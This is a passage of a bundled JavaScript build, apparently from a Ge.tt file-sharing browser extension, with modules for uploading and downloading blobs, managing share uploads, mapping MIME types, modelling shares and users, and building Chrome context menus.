		};
		var unbind = onprogressmessage(function(message) {
			if (ended) {
				return;
			}
			if (message === 110) {
				that.handshake = true;
				that.emit('handshake');
				return;
			}
			if (!that.handshake) {
				return;
			}
			if (message <= 100) {
				that.progress = message;
				that.emit('progress');
				return;
			}
	
			onend(message == 120 ? 'upload' : 'error');
		});
	
		that.destroy = function() {
			onend('error');
		};
	
		return that;
	};
	
	var putInput = function(url, input) {
		var that = common.createEmitter();
		var div = document.createElement('div');
	
		var targetUpload = PREFIX+common.uuid();
		var progressFrame = createProgressFrame(url);
	
		div.innerHTML = ''+
			'<iframe name="'+targetUpload+'" id="'+targetUpload+'"></iframe>'+
			'<form method="post" action="'+progressFrame.uploadURL+'" enctype="multipart/form-data" target="'+targetUpload+'"></form>';	
	
		main().appendChild(div);
	
		var targetFrame = document.getElementById(targetUpload);
		var form = div.getElementsByTagName('form')[0];
		var ended = false;
		var handshaking;
		
		var onnotend = function(fn) {
			return function() {
				if (ended) {
					return;
				}
				fn();
			};
		};
		var tidy = function() {
			main().removeChild(div);		
		};
		var onend = function(timeout) {
			ended = true;
	
			if (!timeout) {
				tidy();
				return;
			}
	
			setTimeout(tidy, timeout);
		};
		var submit = common.once(function() {
			form.submit();
	
			common.step([
				function(next) {
					onevent(targetFrame, 'load', onnotend(next));	
				},
				function(next) {
					setTimeout(onnotend(next), 10000);
				},
				function() {
					onend();
					progressFrame.destroy();
	
					that.emit(progressFrame.handshake ? 'error' : 'upload');
				}
			]);
		});
	
		progressFrame.on('handshake', function() {
			clearTimeout(handshaking);		
			submit();
		});
		progressFrame.on('error', onnotend(function() {
			clearTimeout(handshaking);
	
			targetFrame.src = 'about:blank';
	
			onend(2500);
			that.emit('error');
		}));
		progressFrame.on('upload', onnotend(function() {
			onend(2500);
			that.emit('upload');
		}));
		progressFrame.on('progress', onnotend(function() {
			that.emit('progress', progressFrame.progress);
		}));
	
		that.destroy = function() {
			progressFrame.destroy();
		};
	
		if (input.parentNode) {
			input.parentNode.removeChild(input);
		}
	
		input.id = input.name = (input.name || input.id || targetUpload+'-file');
		form.appendChild(input);
	
		handshaking = setTimeout(submit, 2000);
	
		return that;
	};;
	
	var putFile = function(url, file) {
		var that = common.createEmitter();
		var form = new FormData();
		var xhr = new XMLHttpRequest();
	
		var destroy = function(success) {
			xhr.abort();
		};
	
		if (!xhr.upload) {
			var progressFrame = createProgressFrame(url);
	
			progressFrame.on('error', function() {
				that.emit('error');
			});
			progressFrame.on('upload', function() {
				that.emit('upload');
			});
			progressFrame.on('progress', function() {
				that.emit('progress', progressFrame.progress);
			});
	
			that.destroy = function() {
				destroy();
				progressFrame.destroy();	
			};
	
			url = progressFrame.uploadURL;
		} else {
			var lastProgress = -1;
			var lastTime = 0;
	
			var onuploadevent = function(name, fn) {
				xhr.upload.addEventListener(name, fn, false);		
			};
	
			onuploadevent('progress', function(e) {
				var progress = Math.floor(100 * e.loaded / e.total);
	
				if (progress === lastProgress || now() - lastTime < 500) {
					return;
				}
	
				lastTime = now();
				lastProgress = progress;
				that.emit('progress', progress);			
			});
			onuploadevent('load', function() {
				that.emit('upload');
			});
			onuploadevent('error', function() {
				that.emit('error');
			});
			onuploadevent('abort', function() {
				that.emit('error');
			});
	
			that.destroy = destroy;
		}
	
		that.on('upload', function() {
			that.destroy = noop;
		});
		that.on('error', function() {
			that.destroy = noop;
		});
	
		form.append('blob', file);
	
		xhr.open('POST', url, true);
		xhr.send(form);
	
		return that;
	};
	
	exports.put = function(url, file, callback) {
		var that = common.createEmitter();
		var upload = (isBlob(file) ? putFile : putInput)(addQuery(url, 'nounce', common.uuid()), file);
	
		callback = callback || noop;
	
		var lastProgress = -1;
	
		that.progress = 0;
		that.readyState = 'uploading';
		that.destroy = function() {
			upload.destroy();
		};
	
		upload.on('progress', function(progress) {
			if (lastProgress > progress) {
				upload.destroy();
				return;
			}
			that.progress = progress;
			that.emit('progress', progress);
		});
		upload.on('upload', function() {
			if (that.progress < 100) {
				that.progress = 100;
				that.emit('progress', that.progress);
			}
	
			that.readyState = 'uploaded';
			that.emit('upload');
	
			callback();
		});
		upload.on('error', function() {
			var err = new Error('premature close');
	
			that.readyState = 'failed';
			that.emit('error', err);
	
			callback(err);
		});
	
		return that;
	};
	//@ sourceURL=api/blobs.js
});
rex("bdcf3f0cad1197d7fb888471c1e972b6",{"common":"0a433501923640ab6d616308c9685ac7"},function(module, exports, require) {
	var common = require('common');
	
	var REQUEST_LIMIT = 1;
	
	var Downloader = common.emitter(function(url, data) {
		this.url = url;
		this.data = data || {};
	
		this.blob = null;
		this.progress = 0;
		this.size = 0;
		this.contentType = null;
	
		this.xhr = null;
	});
	
	Downloader.prototype.abort = function() {
		if(!this.xhr) {
			return;
		}
	
		this.xhr.abort();
	};
	
	var DownloadPool = common.emitter(function() {
		this._queue = [];
		this._downloading = [];
	});
	
	DownloadPool.prototype.download = function(url, data) {
		var downloader = new Downloader(url, data);
	
		this._queue.push(downloader);
		setTimeout(this._next.bind(this), 1);
	
		return downloader;
	};
	DownloadPool.prototype.size = function() {
		return this._queue.length + this._downloading.length;
	};
	DownloadPool.prototype._request = function(downloader) {
		var xhr = new XMLHttpRequest();
		var self = this;
	
		downloader.xhr = xhr;
	
		xhr.responseType = 'arraybuffer';
		xhr.onload = function() {
			if(xhr.status !== 200) {
				downloader.emit('error', new Error('Unexpected status ' + xhr.status));
				return;
			}
	
			var blobBuilder = new WebKitBlobBuilder();
	
			blobBuilder.append(xhr.response);
	
			var blob = blobBuilder.getBlob();
	
			downloader.size = downloader.size || blob.size;
			downloader.blob = blob;
	
			downloader.emit('end');
			self.emit('end', downloader);
		};
		xhr.onreadystatechange = function() {
			if(xhr.readyState !== 2) {
				return;
			}
	
			var type = xhr.getResponseHeader('Content-Type');
			var disposition = xhr.getResponseHeader('Content-Disposition');
			var length = xhr.getResponseHeader('Content-Length');
	
			if(disposition) {
				disposition = disposition.split(';').filter(function(part) {
					return part.indexOf('filename=') !== -1;
				})[0];
			}
	
			downloader.contentType = type && type.split(';')[0];
			downloader.contentDisposition = disposition && disposition.split('=')[1].trim();
			downloader.size = downloader.size || (parseInt(length) || 0);
	
			downloader.emit('headers');
		};
		xhr.onerror = function(e) {
			var err = new Error('Network error');
			err.cause = e;
	
			downloader.emit('error', err);
		};
		xhr.onabort = function() {
			downloader.emit('abort');
		};
		xhr.onprogress = function(e) {
			var progress = e.lengthComputable ? Math.round(100 * e.loaded / e.total) : downloader.progress;
	
			if(downloader.progress === progress) {
				return;
			}
	
			downloader.progress = progress;
			downloader.size = e.lengthComputable ? e.total : downloader.size;
	
			downloader.emit('progress');
		};
	
		xhr.open('GET', downloader.url);
		xhr.send(null);
	
		downloader.emit('begin');
		this.emit('download', downloader);
	};
	DownloadPool.prototype._next = function() {
		if(this._downloading.length >= REQUEST_LIMIT || !this._queue.length) {
			return;
		}
	
		var self = this;
		var downloader = this._queue.pop();
		var next = function() {
			self._remove(downloader);
			self._next();
		}; //this._remove.bind(this, downloader);
	
		this._downloading.push(downloader);
	
		downloader.on('end', next);
		downloader.on('error', next);
		downloader.on('abort', next);
	
		this._request(downloader);
	};
	DownloadPool.prototype._remove = function(downloader) {
		//var url = downloader.url;
	
		for(var i = 0; i < this._downloading.length; i++) {
			//if(this._downloading[i].url === url) {
			if(this._downloading[i] === downloader) {
				this._downloading.splice(i, 1);
				return;
			}
		}
	};
	
	exports.create = function() {
		return new DownloadPool();
	};
	
	//@ sourceURL=download.js
});
rex("e54bc31ebef8d770c17e73f6317b1313",{"common":"0a433501923640ab6d616308c9685ac7","mime":"fc0888fde853ad875a7d7be2e1e7acec"},function(module, exports, require) {
	var common = require('common');
	var mimeTypes = require('mime');
	
	var MEASURE_SIZE = 10;
	var MAX_FILE_SIZE = 300 * 1000000;
	
	var parseUrl = function(url) {
		var a = document.createElement('a');
		a.href = url;
	
		url = ['pathname', 'host', 'hostname', 'port', 'protocol', 'search'].reduce(function(acc, name) {
			acc[name] = a[name];
			return acc;
		}, {});
	
		a = null;
	
		url.protocol = url.protocol.slice(0, -1);
		url.port = parseInt(url.port) || 80;
	
		return url;
	};
	var nameFromUrl = function(pathname) {
		var names = pathname.split('/');
		var name = names[names.length - 1] || '';
	
		if(name.indexOf('.') !== -1) {
			return name;
		}
	
		return null;
	};
	var nameFromHeaders = function(options) {
		if(options.contentDisposition) {
			return options.contentDisposition;
		}
	
		return (new Date()).getTime().toString() + (mimeTypes.suffix(options.contentType) || '');
	};
	var now = function() {
		return Math.floor(Date.now() / 1000);
	};
	
	var Uploader = common.emitter(function(url, sharename) {
		this.url = url;
		this.sharename = sharename;
		this.parsedUrl = parseUrl(url);
		this.created = now();
		this.prettyUrl = this.parsedUrl.hostname.replace(/^www\./, '') + this.parsedUrl.pathname;
		this.filename = nameFromUrl(this.parsedUrl.pathname); //getName(url);
		this.id = common.uuid();
	
		this.setResources({ sharename: sharename });
	
		this.state = 'pending';
		this.lastError = null;
	
		this.fileid = null;
		this.contentType = null;
		this.progress = 0;
		this.size = 0;
		this.speed = 0;
		this.estimatedTimeLeft = 0;
		this.gettUrl = 'http://ge.tt';
	
		this._measurePoints = [];
	
		var self = this;
		var cleanup = function() {
			self._measurePoints = [];
		};
	
		this.on('progress', function() {
			self.setSpeed();
		});
		this.on('error', cleanup);
		this.on('done', cleanup);
	});
	
	Uploader.prototype.is = function(state) {
		var states = {};
	
		if(Array.isArray(state)) {
			state.forEach(function(name) {
				states[name] = 1;
			});
		} else if(typeof state === 'string') {
			states[state] = 1;
		}
	
		return this.state in states;
	};
	Uploader.prototype.setError = function(err) {
		if(this.state === 'error') {
			return;
		}
	
		this.state = 'error';
		this.lastError = err;
	
		this.emit('error', err);
	};
	Uploader.prototype.setContentInfo = function(options) {
		this.contentType = options.contentType;
		this.filename = this.filename || nameFromHeaders(options);
	};
	Uploader.prototype.setResources = function(options) {
		this.sharename = options.sharename || this.sharename;
		this.fileid = options.fileid || this.fileid;
		this.gettUrl = 'http://ge.tt';
	
		if(!this.sharename) {
			return;
		}
	
		this.gettUrl += '/' + this.sharename;
	
		if(!this.fileid) {
			return;
		}
	
		this.gettUrl += '/v/' + this.fileid;
	};
	Uploader.prototype.setSpeed = function() {
		var points = this._measurePoints;
	
		var time = now();
		var size = (this.size * 2) * (this.progress / 100);
	
		points.push({
			size: size,
			time: time
		});
	
		if(points.length > MEASURE_SIZE) {
			points.splice(0, 1);
		}
	
		var deltatime = time - points[0].time;
	
		// bytes per second
		this.speed = Math.round(deltatime ? (size - points[0].size) / deltatime : 0);
		this.estimatedTimeLeft = Math.round(this.speed ? ((this.size * 2) - size) / this.speed : 0);
	};
	
	var UploadManager = common.emitter(function(downloadPool, api) {
		this._pool = downloadPool;
		this.uploads = [];
	
		this.setApi(api);
	});
	
	UploadManager.prototype.setApi = function(api) {
		this._api = api;
	
		var self = this;
	
		this._api.on('fileuploading', function(file) {
			var uploader = self._find(file);
	
			if(uploader) {
				debug.debug('Upload started', uploader.url);
	
				return;
			}
	
			debug.warn('No uploader matching file in fileuploading', file);
		});
		this._api.on('fileupload', function(file) {
			var uploader = self._find(file);
	
			file.source = null;
	
			if(uploader) {
				uploader.state = 'done';
	
				debug.info('-- Upload ended', uploader.url, file, uploader);
	
				uploader.emit('done');
	
				return;
			}
	
			debug.warn('No uploader matching file in fileupload', file);
		});
		this._api.on('fileerror', function(file) {
			var uploader = self._find(file);
	
			file.source = null;
	
			if(uploader) {
				uploader.setError(new Error('Upload failed'));
				return;
			}
	
			debug.warn('No uploader matching file in fileerror', file);
		});
		this._api.on('fileprogress', function(file) {
			var uploader = self._find(file);
	
			if(uploader) {
				var progress = Math.round((100 + file.progress) / 2);
	
				if(progress === uploader.progress) {
					return;
				}
	
				uploader.progress = progress;
	
				debug.debug('Upload progress', uploader.url, file.progress, 
					'total progress', uploader.progress, 'speed', uploader.speed);
	
				uploader.emit('progress');
	
				return;
			}
	
			debug.warn('No uploader matching file in fileprogress', file);
		});
	};
	UploadManager.prototype.upload = function(url, sharename) {
		var self = this;
		var uploader = new Uploader(url, sharename);
		var end = this.emit.bind(this, 'end', uploader);
		var error = uploader.setError.bind(uploader);
	
		debug.info('Url added', url, sharename);
	
		this.uploads.splice(0, 0, uploader);
	
		if(uploader.parsedUrl.protocol !== 'http') {
			setTimeout(function() {
				error(new Error('Invalid url \'' + url + '\''));
			}, 1);
	
			return uploader;
		}
	
		uploader.on('done', end);
		uploader.on('error', end);
	
		this.emit('start', uploader);
		
		var downloader = this._pool.download(url);	
	
		downloader.on('begin', function() {
			debug.debug('-- Download started', url);
	
			uploader.state = 'download';
	
			uploader.emit('download');
		});
		downloader.on('headers', function() {
			debug.debug('Headers received', { contentLength: downloader.size, 
				contentType: downloader.contentType, contentDisposition: downloader.contentDisposition });
	
			if(downloader.size > MAX_FILE_SIZE) {
				downloader.abort();
				uploader.setError(new Error('File too big'));
	
				return;
			}
	
			uploader.setContentInfo({ 
				contentType: downloader.contentType,
				contentDisposition: downloader.contentDisposition
			});
	
			uploader.emit('progress');
		});
		downloader.on('error', error);
		downloader.on('progress', function() {
			var progress = Math.round(downloader.progress / 2);
	
			if(progress === uploader.progress) {
				return;
			}
	
			uploader.size = downloader.size;
			uploader.progress = progress;
	
			debug.debug('Download progress', url, downloader.progress, 
				'total progress', uploader.progress, 'speed', uploader.speed);
	
			uploader.emit('progress');
		});
		downloader.on('end', function() {
			uploader.size = downloader.size;
	
			self.emit('metainfo', uploader);
	
			debug.debug('Download ended', url, uploader.contentType, uploader.filename);
	
			common.step([
				function(next) {
					if(uploader.sharename) {
						next(null, { sharename: sharename });
						return;
					}
	
					self._api.post('/1/shares/create', next);
				},
				function(share, next) {
					uploader.setResources({ sharename: share.sharename });
	
					debug.debug('Share ready', url, share);
	
					if(share.created) {
						self.emit('share', share);
					}
	
					self._api.upload(share.sharename, {
						filename: uploader.filename,
						blob: downloader.blob
					}, next);
				},
				function(file) {
					uploader.state = 'upload';
					uploader.setResources({ fileid: file.fileid });
	
					file.__id = uploader.id;
	
					debug.debug('File ready', url, file);
	
					self.emit('file', file);
					uploader.emit('upload');
				}
			], error);
		});
	
		return uploader;
	};
	UploadManager.prototype.activeUploads = function() {
		return this._activeUploads().length;
	};
	UploadManager.prototype.clearInactiveUploads = function() {
		this.uploads = this._activeUploads();
	};
	UploadManager.prototype._activeUploads = function() {
		return this.uploads.filter(function(uploader) {
			return uploader.state in { pending: 1, download:1, upload:1 };
		});
	};
	UploadManager.prototype._find = function(file) {
		var id = file.__id;
	
		return this.uploads.filter(function(uploader) {
			return uploader.id === id;
		})[0];
	};
	
	exports.create = function(downloadPool, api, application) {
		return new UploadManager(downloadPool, api, application);
	};
	
	//@ sourceURL=upload.js
});
rex("fc0888fde853ad875a7d7be2e1e7acec",{},function(module, exports, require) {
	var suffixMap = {
		'.ai'     : 'application/postscript',
		'.aif'    : 'audio/x-aiff',
		'.aifc'   : 'audio/x-aiff',
		'.aiff'   : 'audio/x-aiff',
		'.au'     : 'audio/basic',
		'.avi'    : 'video/x-msvideo',
		'.bcpio'  : 'application/x-bcpio',
		'.bmp'    : 'image/x-ms-bmp',
		'.cdf'    : 'application/x-cdf',
		'.cdf'    : 'application/x-netcdf',
		'.cpio'   : 'application/x-cpio',
		'.csh'    : 'application/x-csh',
		'.css'    : 'text/css',
		'.doc'    : 'application/msword',
		'.dvi'    : 'application/x-dvi',
		'.eml'    : 'message/rfc822',
		'.eps'    : 'application/postscript',
		'.etx'    : 'text/x-setext',
		'.gif'    : 'image/gif',
		'.gtar'   : 'application/x-gtar',
		'.hdf'    : 'application/x-hdf',
		'.html'   : 'text/html',
		'.ief'    : 'image/ief',
		'.jpg'    : 'image/jpeg',
		'.js'     : 'application/x-javascript',
		'.latex'  : 'application/x-latex',
		'.m1v'    : 'video/mpeg',
		'.man'    : 'application/x-troff-man',
		'.me'     : 'application/x-troff-me',
		'.mht'    : 'message/rfc822',
		'.mhtml'  : 'message/rfc822',
		'.mif'    : 'application/x-mif',
		'.mov'    : 'video/quicktime',
		'.movie'  : 'video/x-sgi-movie',
		'.mp3'    : 'audio/mpeg',
		'.mp4'    : 'video/mp4',
		'.mpa'    : 'video/mpeg',
		'.mpe'    : 'video/mpeg',
		'.mpeg'   : 'video/mpeg',
		'.mpg'    : 'video/mpeg',
		'.ms'     : 'application/x-troff-ms',
		'.nc'     : 'application/x-netcdf',
		'.nws'    : 'message/rfc822',
		'.oda'    : 'application/oda',
		'.p12'    : 'application/x-pkcs12',
		'.p7c'    : 'application/pkcs7-mime',
		'.pbm'    : 'image/x-portable-bitmap',
		'.pdf'    : 'application/pdf',
		'.pfx'    : 'application/x-pkcs12',
		'.pgm'    : 'image/x-portable-graymap',
		'.png'    : 'image/png',
		'.pnm'    : 'image/x-portable-anymap',
		'.ppm'    : 'image/x-portable-pixmap',
		'.pps'    : 'application/vnd.ms-powerpoint',
		'.ppt'    : 'application/vnd.ms-powerpoint',
		'.ps'     : 'application/postscript',
		'.pwz'    : 'application/vnd.ms-powerpoint',
		'.py'     : 'text/x-python',
		'.pyc'    : 'application/x-python-code',
		'.qt'     : 'video/quicktime',
		'.ra'     : 'audio/x-pn-realaudio',
		'.ram'    : 'application/x-pn-realaudio',
		'.ras'    : 'image/x-cmu-raster',
		'.rdf'    : 'application/xml',
		'.rgb'    : 'image/x-rgb',
		'.roff'   : 'application/x-troff',
		'.rtx'    : 'text/richtext',
		'.sgm'    : 'text/x-sgml',
		'.sgml'   : 'text/x-sgml',
		'.sh'     : 'application/x-sh',
		'.shar'   : 'application/x-shar',
		'.snd'    : 'audio/basic',
		'.src'    : 'application/x-wais-source',
		'.sv4cpio': 'application/x-sv4cpio',
		'.sv4crc' : 'application/x-sv4crc',
		'.swf'    : 'application/x-shockwave-flash',
		'.t'      : 'application/x-troff',
		'.tar'    : 'application/x-tar',
		'.tcl'    : 'application/x-tcl',
		'.tex'    : 'application/x-tex',
		'.texi'   : 'application/x-texinfo',
		'.texinfo': 'application/x-texinfo',
		'.tiff'   : 'image/tiff',
		'.tr'     : 'application/x-troff',
		'.tsv'    : 'text/tab-separated-values',
		'.txt'    : 'text/plain',
		'.ustar'  : 'application/x-ustar',
		'.vcf'    : 'text/x-vcard',
		'.wav'    : 'audio/x-wav',
		'.wiz'    : 'application/msword',
		'.wsdl'   : 'application/xml',
		'.xbm'    : 'image/x-xbitmap',
		'.xls'    : 'application/excel',
		'.xls'    : 'application/vnd.ms-excel',
		'.xml'    : 'text/xml',
		'.xpdl'   : 'application/xml',
		'.xpm'    : 'image/x-xpixmap',
		'.xsl'    : 'application/xml',
		'.xwd'    : 'image/x-xwindowdump',
		'.zip'    : 'application/zip',
		'.flv'    : 'video/x-flv'
	}
	var typesMap = {};
	
	for(var suffix in suffixMap) {
		typesMap[suffixMap[suffix]] = suffix;
	}
	
	exports.suffix = function(type) {
		return typesMap[type];
	};
	exports.type = function(suffix) {
		return suffixMap[suffix];
	};
	
	//@ sourceURL=mime.js
});
rex("34c71697c8c78793e56b3a81ab4a51b4",{},function(module, exports, require) {
	//var datetime = require('shared/date.format');
	
	var UNITS = ['B', 'KB', 'MB', 'GB', 'TB'];
	var sizeFormat = function(num, dec) {
		var unit = UNITS[0];
	
		for (var i = 0; ((i < UNITS.length-1) && num >= 1000); i++) {
			num /= 1000;
			unit = UNITS[i+1];
		}
	
		if (dec && num < 10) {
			num = Math.floor(10*num)/10;
		} else {
			num = Math.floor(num);
		}
		return num+' '+unit;
	};
	var shareTitle = function(share) {
		if (share.title) {
			return share.title;
		} else if(share.files.length === 1) {
			return share.files[0].filename;
		}
	
		return share.files.length+' '+({image:'images',audio:'songs',doc:'documents'}[share.getType()] || 'files');
	};
	var reduceFiles = function(share, init, fn) {
		return function() {
			var files = share.files;
			var acc = init;
	
			for(var i in files) {
				var file = files[i];
	
				acc = fn(acc, file);
			}
	
			return acc;
		};
	};
	var date = function(time) {
		time = new Date(time * 1000);
	
		return time.toString();
		//return time.format('dd mmm yyyy');
	};
	var filetype = function(filename) {
		if (/\.(jpg|jpeg|png|gif)$/i.test(filename)) {
			return 'image';
		}
		if (/\.(mp3)$/i.test(filename)) {
			return 'audio';
		}
		if (/\.(txt|readme|nfo|html|htm|doc|docx|pdf|ppt|pptx|tiff)$/i.test(filename)) {
			return 'doc';
		}
	
		return 'misc';
	};
	
	exports.create = function(host) {
		if(typeof host !== 'function') {
			var originalHost = (host || '').indexOf('://') === -1 ? 'http://' + host : host;
	
			host = function() {
				return originalHost;
			};
		}
	
		var that = {};
	
		that.share = function(share) {
			for (var i = 0; i < share.files.length; i++) {
				share.files[i] = that.file(share.files[i], share);
			}
	
			share.getSize = reduceFiles(share, 0, function(acc, file) {
				return acc + (file.size || 0);
			});
			share.getDownloads = reduceFiles(share, 0, function(acc, file) {
				return acc + file.downloads;
			});
			share.getType = reduceFiles(share, null, function(acc, file) {
				return (!acc || acc === file.filetype) ? file.filetype : 'misc';
			});
			share.getTitle = function() {
				return shareTitle(share);
			};
	
			share.createdDate = date(share.created);
			share.zipurl = host()+'/1/shares/'+share.sharename+'/zip';
	
			share.formatSize = function() {
				var size = share.getSize();
				
				return size ? sizeFormat(size || 0, true) : '~';			
			};
			share.ready = function() {
				return share.readystate === 'ready';
			};
	
			return share;
		};
		that.shares = function(shares) {
			for (var i = 0; i < shares.length; i++) {
				shares[i] = that.share(shares[i]);
			}
			return shares;
		};
		that.file = function(file, share) {
			share = share || {};
	
			file.sharename = file.sharename || share.sharename;
			file.userid = file.userid || share.userid;
	
			file.extension = file.filename.split('.').pop().substring(0, 4).toLowerCase();
			file.filetype = filetype(file.filename); //shareutils.filetype(file.filename);
			file.createdDate = date(file.created);
	
			//file.bloburl = host()+'/1/files/'+file.sharename+'/'+file.fileid+'/blob';
	
			var bloburl = host()+'/1/files/'+file.sharename+'/'+file.fileid+'/blob';
			var normalizeUrl = function(url) {
				return url && url.replace(/\(/g, '%28').replace(/\)/g, '%29').replace(/'/g, '%27');
			};
			var createUrls = function(bloburl, query) {
				query = query ? '?' + query : '';
	
				file.bloburl = bloburl + query;
				file.downloadurl = bloburl + '?download';
	
				if (file.filetype === 'image') {
					file.teaserurl = normalizeUrl(file.thumbs && file.thumbs['50x36']) || (bloburl+'/50x36?method=thumb');
					file.thumburl = normalizeUrl(file.thumbs && file.thumbs['185x135']) || (bloburl+'/185x135?method=thumb');
					file.scaleurl = bloburl+'/x675' + query;
				}
	
				file.viewurl = bloburl + query;
	
				if(file.filetype === 'image' && file.extension !== 'gif') {
					file.viewurl = file.scaleurl;
				}
				else if(file.filetype === 'doc') {
					file.viewurl = '/s/viewers/doc.html?url=' + encodeURIComponent(bloburl + query) + '&extension=' + file.extension;
				}
			};
	
			createUrls(bloburl);
	
			file.formatSize = function() {
				return this.size ? sizeFormat(this.size, true) : '~';			
			};
			file.uploaded = function() {
				return this.readystate === 'uploaded';	
			};
			file.failed = function() {
				return !(this.readystate in { remote: 1, uploaded: 1, uploading: 1 });
			};
			file.errorMessage = function() {
				return {
					storagelimit: 'Sorry, no space left for the file',
					violatedterms: 'This file has violated the terms of services',
					failed: 'Failed to upload file'
				}[this.readystate] || null;
			};
			file.user = function(user) {
				var owns = user.owns(file) ? 'noinc=1' : '';
	
				createUrls(bloburl, owns);
	
				return file;
			};
	
			return file;
		};
		that.user = function(user) {
			user.anon = user.type === 'anon';
			user.paying = !user.anon && user.type !== 'free';
			user.fromFacebook = !!user.facebookuserid;
			user.unread = user.unread || 0;
	
			var storage = Math.min(user.storage.limit, user.storage.used);
			var percentage = Math.floor(100*storage/user.storage.limit);
	
			user.storage.usedPercentage = percentage;
			user.storage.formatted = {
				used: sizeFormat(Math.min(user.storage.used, user.storage.limit)),
				limit: sizeFormat(user.storage.limit),
				extra: user.storage.extra && sizeFormat(user.storage.extra)
			}
	
			user.fresh = user.anon && !user.files; // todo, find out when this is correct
	
			user.owns = function(resource) {
				if(!resource || !resource.userid) {
					return false;
				}
	
				return user.userid === resource.userid;
			};
			
			return user;
		};
	
		return that;
	};
	
	//@ sourceURL=models.js
});
rex("1a0727073f78dea597ee3f35fc6cc69b",{},function(module, exports, require) {
	var gc = function(emitter) {
		var arr = [function() {
			emitter.removeListener('newListener', cleaner);
		}];
		var cleaner = function(name, fn) {
			arr.push(function() {
				emitter.removeListener(name, fn);
			});
		};
	
		emitter.on('newListener', cleaner);
	
		return function(removeAll) {
			while ((removeAll && arr.length) || arr.length > 1) {
				arr.pop()();
			}
		};
	};
	
	var GarbageCollector = function() {
		this._cleaners = [];
	};
	
	GarbageCollector.prototype.register = function(emitters) {
		var self = this;
	
		if(!Array.isArray(emitters)) {
			emitters = Array.prototype.map.call(arguments, function(arg) {
				return arg;
			});
		}
	
		emitters.forEach(function(emitter) {
			self._cleaners.push(gc(emitter));
		});
	};
	
	GarbageCollector.prototype.free = function() {
		for(var i in this._cleaners) {
			this._cleaners[i]();
		}
	};
	
	GarbageCollector.prototype.clean = function() {
		while(this._cleaners.length) {
			this._cleaners.pop()(true);
		}
	};
	
	exports.create = function() {
		var gc = new GarbageCollector();
	
		return gc;
	};
	
	//@ sourceURL=gc.js
});
rex("790b438e3e752138798076c30947fb88",{"common":"0a433501923640ab6d616308c9685ac7"},function(module, exports, require) {
	var common = require('common');
	
	var UserOptions = common.emitter(function(defaults) {
		var opts = localStorage.getItem('userOptions');
	
		this._options = opts ? JSON.parse(opts) : {};
	
		if(defaults) {
			for(var name in defaults) {
				var value = this._options[name];
	
				this._options[name] = typeof value === 'undefined' ? defaults[name] : value;
			}
	
			this._writeOptions();
		}
	});
	
	UserOptions.prototype.bootstrap = function(opts) {
		opts = common.join(this._options, opts || {});
	
		this.emit('change', opts);
	};
	UserOptions.prototype.keys = function() {
		return Object.keys(this._options);
	};
	UserOptions.prototype.set = function(name, value) {
		var old = this._options[name];
	
		if(old !== value) {
			this._options[name] = value;
			this._writeOptions();
	
			this.emit('change', this._options);
		}
	};
	UserOptions.prototype.get = function(name) {
		return this._options[name];
	};
	UserOptions.prototype._writeOptions = function() {
		localStorage.setItem('userOptions', JSON.stringify(this._options));
	};
	
	exports.create = function(defaults) {
		return new UserOptions(defaults);
	};
	
	//@ sourceURL=user-options.js
});
rex("51cff7e48f0fcc316c3ef7b5cb7c21a7",{"common":"0a433501923640ab6d616308c9685ac7"},function(module, exports, require) {
	var common = require('common');
	
	//var MENU_CONTEXTS = ['link', 'image', 'video', 'audio', 'frame'];
	var MENU_CONTEXTS = ['all'];
	
	var noop = function() {};
	var nullify = function(fn) {
		return function() {
			fn();
		};
	};
	
	var findItem = function(items, item) {
		for(var i = 0; i < items.length; i++) {
			var it = items[i];
	
			if(it === item) {
				return i;
			}
		}
	
		return -1;
	};
	
	var MenuItem = function(title, options) {
		options = options || {};
	
		this.id = null;
		this.parent = null;
		this.name = options.name;
	
		delete options.name;
	
		this._options = common.join({ title: title, contexts: MENU_CONTEXTS }, options);
		this._children = [];
	};
	
	MenuItem.separator = function() {
		var sep = new MenuItem(null, { type: 'separator' });
	
		delete sep._options.title;
	
		return sep;
	};
	
	MenuItem.prototype.create = function(callback) {
		if(this.id) {
			throw new Error('Cannot create an already existing item');
		}
	
		callback = callback || noop;
	
		var options = common.join(this._options);
		var self = this;
	
		if(this.parent) {
			options = common.join(options, { parentId: this.parent.id });
		}
	
		common.step([
			function(next) {
				self.id = chrome.contextMenus.create(options, nullify(next.parallel()));
				
				/*if(!self._children.length) {
					next.parallel()();
					return;
				}*/
	
				self._children.slice().forEach(function(item) {
					item.create(nullify(next.parallel()));
				});
			},
			function() {
				callback();
			}
		])
	};
	MenuItem.prototype.destroy = function(callback) {
		if(!this.id) {
			throw new Error('Cannot destroy non existing item');
			//return;
		}
	
		if(this.parent) {
			this.parent.remove(this);
			this.parent = null;
		}
	
		var id = this.id;
		
		this.id = null;
		this._children = [];
	
		chrome.contextMenus.remove(id, callback);
	};
	MenuItem.prototype.get = function(name) {
		return this._children.filter(function(item) {
			return item.name === name;
		})[0];
	};
	MenuItem.prototype.add = function(item) {
		if(item.id) {
			throw new Error('Item already created');
		}
	
		item.parent = this;
		this._children.push(item);
	};
	MenuItem.prototype.remove = function(item) {
		var index = findItem(this._children, item);
	
		if(index === -1) {
			throw new Error('Given item is not child of this item');
		}
	
		this._children.splice(index, 1);
	};
	
	var MenuItemGroup = function(options) {
		this.parent = null;
		this.name = (options || {}).name;
	
		this._items = [];
	};
	
	MenuItemGroup.prototype.__defineGetter__('id', function() {
		return this.parent && this.parent.id;
	})
	MenuItemGroup.prototype.create = function(callback) {
		this._execute('create', callback)
	};
	MenuItemGroup.prototype.destroy = function(callback) {
		if(this.parent) {
			this.parent.remove(this);
			this.parent = null;
		}
	
		this._execute('destroy', callback);
	};
	MenuItemGroup.prototype.get = function(name) {
		return this._items.filter(function(item) {
			return item.name === name;
		})[0];
	};
	MenuItemGroup.prototype.add = function(item) {
		item.parent = this;
		this._items.push(item);
	};
	MenuItemGroup.prototype.remove = function(item) {
		var index = findItem(this._items, item);
	
		if(index === -1) {
			throw new Error('Given item is not child of this item');
		}
	
		this._items.splice(index, 1);
	};
	MenuItemGroup.prototype._execute = function(action, callback) {
		var self = this;
	
		common.step([
			function(next) {
				if(!self._items.length) {
					next();
					return;
				}
	
				self._items.slice().forEach(function(item) {
					item[action](nullify(next.parallel()));
				});
			},
			function() {
				(callback || noop)();
			}
		]);
	};
	
	exports.createItem = function(title, options) {
		return new MenuItem(title, options);
	};
	exports.createItemGroup = function(options) {
		return new MenuItemGroup(options);
	};
	exports.createSeparator = function() {
		return MenuItem.separator();
	};
	
	//@ sourceURL=context-menu.js
});
rex.run("b11e783ac79f48732db72a41be59458c",[]);
